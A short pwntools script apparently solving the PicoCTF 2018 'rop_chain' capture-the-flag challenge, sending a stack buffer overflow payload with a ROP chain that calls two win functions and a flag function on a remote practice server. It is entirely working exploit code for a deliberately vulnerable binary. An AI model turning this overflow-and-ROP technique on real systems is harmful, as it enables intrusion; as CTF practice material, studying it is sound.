from pwn import *

context.log_level = 'debug'
# io = process('PicoCTF_2018_rop_chain')
io = remote('node4.buuoj.cn', 25973)
elf = ELF('PicoCTF_2018_rop_chain')
win1 = elf.symbols['win_function1']
win2 = elf.symbols['win_function2']
flag = elf.symbols['flag']

payload = cyclic(0x1c) + p32(win1) + p32(win2) + p32(flag) + p32(0xBAAAAAAD) + p32(0xDEADBAAD)
io.sendlineafter('Enter your input> ', payload)
io.recv()

